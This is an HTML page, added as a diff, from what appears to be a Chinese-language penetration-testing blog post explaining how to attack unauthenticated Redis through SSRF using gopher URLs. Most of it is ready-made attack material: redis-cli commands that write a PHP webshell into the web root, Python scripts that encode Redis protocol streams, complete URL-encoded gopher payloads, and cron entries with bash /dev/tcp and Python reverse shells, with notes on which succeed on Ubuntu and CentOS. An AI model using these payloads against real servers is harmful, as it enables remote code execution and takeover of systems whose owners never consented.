@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>redis hacker</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/redis-hacker.html" rel="bookmark"
+           title="Permalink to redis hacker">redis hacker</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-12-05T00:00:00+01:00">
+                <a href='#'>12/05/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>Orange在BH大会的paper上面这么说的:</p>
+<div class="highlight"><pre><span></span><span class="n">Protocols</span> <span class="n">that</span> <span class="k">are</span> <span class="n">suitable</span> <span class="k">to</span> <span class="n">smuggle</span>
+  <span class="n">HTTP</span> <span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
+    <span class="n">Elastic</span><span class="p">,</span> <span class="n">CouchDB</span><span class="p">,</span> <span class="n">Mongodb</span><span class="p">,</span> <span class="n">Docker</span>
+
+  <span class="nb">Text</span><span class="o">-</span><span class="n">based</span> <span class="n">protocol</span><span class="p">:</span>
+    <span class="n">FTP</span><span class="p">,</span> <span class="n">SMTP</span><span class="p">,</span> <span class="n">Redis</span><span class="p">,</span> <span class="n">Memcached</span>
+</pre></div>
+
+
+<p>Ph在他<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a>
+在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
+<ul>
+<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
+<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
+<li>然后再正常使用redis来攻击</li>
+</ul>
+<h2>写shell</h2>
+<p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
+<div class="highlight"><pre><span></span><span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">127.0.0.1</span> <span class="nx">flushall</span>
+<span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">127.0.0.1</span> <span class="nx">config</span> <span class="nx">set</span> <span class="nx">dir</span> <span class="o">/</span><span class="kd">var</span><span class="err">/www</span>
+<span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">127.0.0.1</span> <span class="nx">config</span> <span class="nx">set</span> <span class="nx">dbfilename</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">php</span>
+<span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">127.0.0.1</span> <span class="nx">set</span> <span class="nx">webshell</span> <span class="s2">&quot;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="s2">&quot;</span>
+<span class="nx">redis</span><span class="o">-</span><span class="nx">cli</span> <span class="o">-</span><span class="nx">h</span> <span class="mf">127.0.0.1</span> <span class="nx">save</span> 
+</pre></div>
+
+
+<p>然后得到的数据流如下：</p>
+<div class="highlight"><pre><span></span><span class="o">*</span><span class="mi">1</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$8</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">flushall</span><span class="err">\</span><span class="nx">r</span>
+<span class="o">*</span><span class="mi">4</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$6</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">config</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">set</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">dir</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$8</span><span class="err">\</span><span class="nx">r</span>
+<span class="err">/var/www\r</span>
+<span class="o">*</span><span class="mi">4</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$6</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">config</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">set</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$10</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">dbfilename</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$9</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">shell</span><span class="p">.</span><span class="nx">php</span><span class="err">\</span><span class="nx">r</span>
+<span class="o">*</span><span class="mi">3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">set</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$3</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">web</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$18</span><span class="err">\</span><span class="nx">r</span>
+<span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">\</span><span class="nx">r</span>
+<span class="o">*</span><span class="mi">1</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">$4</span><span class="err">\</span><span class="nx">r</span>
+<span class="nx">save</span><span class="err">\</span><span class="nx">r</span>
+</pre></div>
+
+
+<p>参考joychou写cron的脚本转换，python转换脚本如下:</p>
+<div class="highlight"><pre><span></span><span class="s s-Atom">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s s-Atom">&#39;/xxxxx/Desktop/3.txt&#39;</span><span class="p">,</span> <span class="s s-Atom">&#39;r&#39;</span><span class="p">)</span>
+<span class="s s-Atom">s</span> <span class="o">=</span> <span class="s s-Atom">&#39;&#39;</span>
+<span class="s s-Atom">for</span> <span class="s s-Atom">line</span> <span class="s s-Atom">in</span> <span class="s s-Atom">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span><span class="s s-Atom">:</span>
+    <span class="s s-Atom">#</span> <span class="s s-Atom">if</span> <span class="s s-Atom">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s s-Atom">r</span><span class="s2">&quot;\r&quot;</span><span class="s s-Atom">:</span>
+    <span class="s s-Atom">#</span>   <span class="s s-Atom">print</span> <span class="s s-Atom">line</span>
+    <span class="s s-Atom">#</span> <span class="s s-Atom">print</span> <span class="s s-Atom">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="s s-Atom">if</span> <span class="s s-Atom">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s s-Atom">r</span><span class="s2">&quot;\r&quot;</span><span class="s s-Atom">:</span>
+        <span class="s s-Atom">line</span> <span class="o">=</span> <span class="s s-Atom">line</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s s-Atom">r</span><span class="s2">&quot;\r&quot;</span><span class="p">,</span> <span class="s2">&quot;%0d%0a&quot;</span><span class="p">)</span>
+        <span class="s s-Atom">line</span> <span class="o">=</span> <span class="s s-Atom">line</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s2">&quot;\n&quot;</span><span class="p">,</span> <span class="s s-Atom">&#39;&#39;</span><span class="p">)</span>
+        <span class="s s-Atom">s</span> <span class="o">=</span> <span class="s s-Atom">s</span> <span class="o">+</span> <span class="s s-Atom">line</span>
+<span class="s s-Atom">print</span> <span class="s s-Atom">s</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s2">&quot;$&quot;</span><span class="p">,</span> <span class="s2">&quot;%24&quot;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>如上的写shell数据流经过编码如下(注意php的shell那里，经过上面转换还是尖括号，两个尖括号和<code>;</code>要经过url编码，然后使用curl直接发送如下，我也不知道为啥<code>$</code>还要编码，知道的同学请告知，谢谢）:</p>
+<div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="ss">&quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0a&quot;</span>
+</pre></div>
+
+
+<p>然后上面的payload在存在ssrf的时候，使用发送之前要url编码一次，发送即可得到shell。</p>
+<div class="highlight"><pre><span></span><span class="n">gopher</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">2</span><span class="n">F</span><span class="o">%</span><span class="mi">2</span><span class="n">F127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">3</span><span class="n">A6378</span><span class="o">%</span><span class="mi">2</span><span class="n">F_</span><span class="o">*</span><span class="mi">1</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25248</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aflushall</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">*</span><span class="mi">4</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25246</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25243</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aset</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25243</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">adir</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25248</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">2</span><span class="n">Fvar</span><span class="o">%</span><span class="mi">2</span><span class="n">Fwww</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">*</span><span class="mi">4</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25246</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25243</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aset</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">252410</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">adbfilename</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25249</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">ashell</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">*</span><span class="mi">3</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25243</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aset</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25243</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aweb</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">252418</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">253</span><span class="k">C</span><span class="o">%</span><span class="mi">253</span><span class="n">Fphp</span><span class="o">%</span><span class="mi">20</span><span class="n">phpinfo</span><span class="p">()</span><span class="o">%</span><span class="mi">253</span><span class="n">B</span><span class="o">%</span><span class="mi">253</span><span class="n">F</span><span class="o">%</span><span class="mi">253</span><span class="n">E</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">*</span><span class="mi">1</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span><span class="o">%</span><span class="mi">25244</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">asave</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">a</span>
+</pre></div>
+
+
+<h3>写定时任务</h3>
+<p>测试环境：
+ubuntu  14.04.5 LTS
+centos  6.7</p>
+<p>直接crontab -e编辑:</p>
+<div class="highlight"><pre><span></span><span class="o">*/</span><span class="mi">1</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+
+<p>在ubuntu下不会反弹成功，centos可以反弹成功。</p>
+<p>改为Python反弹:</p>
+<div class="highlight"><pre><span></span><span class="o">*/</span><span class="mi">1</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
+</pre></div>
+
+
+<p>ubuntu和Linux均反弹成功。</p>
+<ol>
+<li>编辑/etc/crontab，使用上面两个payload，注意［这里定时任务需要加user］</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="o">*/</span><span class="mi">1</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">root</span>  <span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span>
+</pre></div>
+
+
+<p>在ubuntu下，bash反弹失败，python反弹成功。
+在CentOS下，两个均成功。</p>
+<ol>
+<li>编辑/var/spool/cron/root文件，使用上面两个反弹shell:</li>
+</ol>
+<p>在Ubuntu下，两个均失败。
+在CentOS下，两个均成功。</p>
+<ol>
+<li>编辑/var/spool/cron/crontabs/root(Centos默认没有这个路径），所以这个是ubuntu测试：</li>
+</ol>
+<p>bash反弹失败
+python反弹成功</p>
+<p>Centos的定式任务在<code>/var/spool/cron/root</code>
+Ubuntu定时任务<code>/var/spool/cron/crontabs/root</code></p>
+<p>所以如果redis里面写shell，<a href="https://joychou.org/web/hackredis-enhanced-edition-script.html">https://joychou.org/web/hackredis-enhanced-edition-script.html</a>，由于使用redis写crontab的时候，创建的文件权限是644，ubuntu无法执行，所以ubuntu下使用redis写shell是无法成功的。</p>
+<p>写入/etc/crontab的时候，由于存在乱码，所以会导致ubuntu不能正确识别，导致定时任务失败。</p>
+<p>所以以上两点来看，ubuntu利用写文件执行crontab不会成功：</p>
+<ul>
+<li>如果写/etc/crontab，语法不识别</li>
+<li>如果写<code>/var/spool/cron/crontabs/root</code>，权限不是root，语法不识别。</li>
+</ul>
+<p>如果只能写文件，想反弹shell通用，比如redis的未授权访问（ubuntu这种情况下无解）：</p>
+<ol>
+<li>写/etc/crontab文件</li>
+<li>使用python反弹shell脚本</li>
+</ol>
+<p>如果可以执行命令，想反弹shell，比如docker remote api未授权访问：</p>
+<ol>
+<li>写当前用户下crontab或者写<code>/etc/crontab</code>也可以。</li>
+<li>使用python反弹shell脚本</li>
+</ol>
+<p>下面这个是从<a href="https://joychou.org/web/phpssrf.html">https://joychou.org/web/phpssrf.html</a>这里搬来的代码，出来的结果，我这里发现需要对其中的<code>$</code>编码（另外说一句，这个<code>$</code>直接写在md之后，会改变文字的意思。貌似是个特殊字符。</p>
+<div class="highlight"><pre><span></span><span class="s s-Atom">#</span><span class="nn">coding</span><span class="p">:</span> <span class="s s-Atom">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="s s-Atom">#</span><span class="nn">author</span><span class="p">:</span> <span class="nv">JoyChou</span>
+<span class="s s-Atom">import</span> <span class="s s-Atom">sys</span>
+
+<span class="s s-Atom">exp</span> <span class="o">=</span> <span class="s s-Atom">&#39;&#39;</span>
+
+<span class="s s-Atom">with</span> <span class="nf">open</span><span class="p">(</span><span class="s s-Atom">&#39;/Users/xxx/Desktop/1.txt&#39;</span><span class="p">)</span> <span class="s s-Atom">as</span> <span class="nn">f</span><span class="p">:</span>
+    <span class="s s-Atom">for</span> <span class="s s-Atom">line</span> <span class="s s-Atom">in</span> <span class="s s-Atom">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span><span class="s s-Atom">:</span>
+        <span class="s s-Atom">if</span> <span class="s s-Atom">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="s s-Atom">in</span> <span class="s s-Atom">&#39;&gt;&lt;+&#39;:</span>
+            <span class="s s-Atom">continue</span>
+        <span class="s s-Atom">#</span> <span class="s s-Atom">判断倒数第2、</span><span class="mi">3</span><span class="s s-Atom">字符串是否为\r</span>
+        <span class="s s-Atom">elif</span> <span class="s s-Atom">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s s-Atom">r&#39;\r&#39;:</span>
+            <span class="s s-Atom">#</span> <span class="s s-Atom">如果该行只有\r，将\r替换成</span><span class="c1">%0a%0d%0a</span>
+            <span class="s s-Atom">if</span> <span class="nf">len</span><span class="p">(</span><span class="s s-Atom">line</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="s s-Atom">:</span>
+                <span class="s s-Atom">exp</span> <span class="o">=</span> <span class="s s-Atom">exp</span> <span class="o">+</span> <span class="s s-Atom">&#39;%0a%0d%0a&#39;</span>
+            <span class="nn">else</span><span class="p">:</span>
+                <span class="s s-Atom">line</span> <span class="o">=</span> <span class="s s-Atom">line</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s s-Atom">r&#39;\r&#39;</span><span class="p">,</span> <span class="s s-Atom">&#39;%0d%0a&#39;</span><span class="p">)</span>
+                <span class="s s-Atom">#</span> <span class="s s-Atom">去掉最后的换行符</span>
+                <span class="s s-Atom">line</span> <span class="o">=</span> <span class="s s-Atom">line</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s s-Atom">&#39;\n&#39;</span><span class="p">,</span> <span class="s s-Atom">&#39;&#39;</span><span class="p">)</span>
+                <span class="s s-Atom">exp</span> <span class="o">=</span> <span class="s s-Atom">exp</span> <span class="o">+</span> <span class="s s-Atom">line</span>
+        <span class="s s-Atom">#</span> <span class="s s-Atom">判断是否是空行，空行替换为</span><span class="c1">%0a</span>
+        <span class="s s-Atom">elif</span> <span class="s s-Atom">line</span> <span class="o">==</span> <span class="s s-Atom">&#39;\x0a&#39;:</span>
+            <span class="s s-Atom">exp</span> <span class="o">=</span> <span class="s s-Atom">exp</span> <span class="o">+</span> <span class="s s-Atom">&#39;%0a&#39;</span>
+        <span class="nn">else</span><span class="p">:</span>
+            <span class="s s-Atom">line</span> <span class="o">=</span> <span class="s s-Atom">line</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s s-Atom">&#39;\n&#39;</span><span class="p">,</span> <span class="s s-Atom">&#39;&#39;</span><span class="p">)</span>
+            <span class="s s-Atom">exp</span> <span class="o">=</span> <span class="s s-Atom">exp</span> <span class="o">+</span> <span class="s s-Atom">line</span>
+<span class="s s-Atom">print</span> <span class="s s-Atom">exp</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s s-Atom">&#39;$&#39;</span><span class="p">,</span> <span class="s s-Atom">&#39;%24&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>攻击的时候时候，使用的是这样的exp:</p>
+<div class="highlight"><pre><span></span><span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span>
+<span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="n">root</span>
+<span class="k">set</span> <span class="n">www</span> <span class="ss">&quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n&quot;</span>
+<span class="n">save</span>
+</pre></div>
+
+
+<p>经过编码之后，得到的exp:</p>
+<div class="highlight"><pre><span></span><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_</span><span class="o">*</span><span class="mi">4</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">246</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aset</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">adir</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">2415</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">*</span><span class="mi">4</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">246</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aset</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">2410</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">adbfilename</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">244</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aroot</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">*</span><span class="mi">3</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aset</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">243</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">awww</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">2455</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">*/</span><span class="mi">1</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="mi">2333</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">*</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="o">%</span><span class="mi">244</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">asave</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span>
+</pre></div>
+
+
+<p>然后上面的再经过http编码即可攻击成功。</p>
+<ul>
+<li>https://www.hugeserver.com/kb/install-redis-centos/</li>
+<li>https://joychou.org/web/phpssrf.html</li>
+<li>https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</li>
+<li>http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/</li>
+<li>https://blog.chaitin.cn/gopher-attack-surfaces/</li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
